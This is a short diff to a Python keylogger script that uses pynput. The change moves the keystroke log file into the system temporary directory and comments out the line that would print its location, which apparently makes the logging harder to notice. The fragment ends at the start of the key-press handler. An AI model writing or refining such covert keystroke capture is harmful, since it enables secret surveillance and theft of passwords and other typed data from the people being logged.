@@ -1,6 +1,14 @@
 from pynput import keyboard
+import os
+import tempfile
 
-log_file_path = "keylog.txt"
+# Get a temporary directory path
+TEMP_DIR = tempfile.gettempdir()
+LOG_FILE_NAME = "keylog.txt"
+# Define the full path for the log file
+log_file_path = os.path.join(TEMP_DIR, LOG_FILE_NAME)
+
+# print(f"Keylog path: {log_file_path}") # Commented out
 
 def on_press(key):
     try:
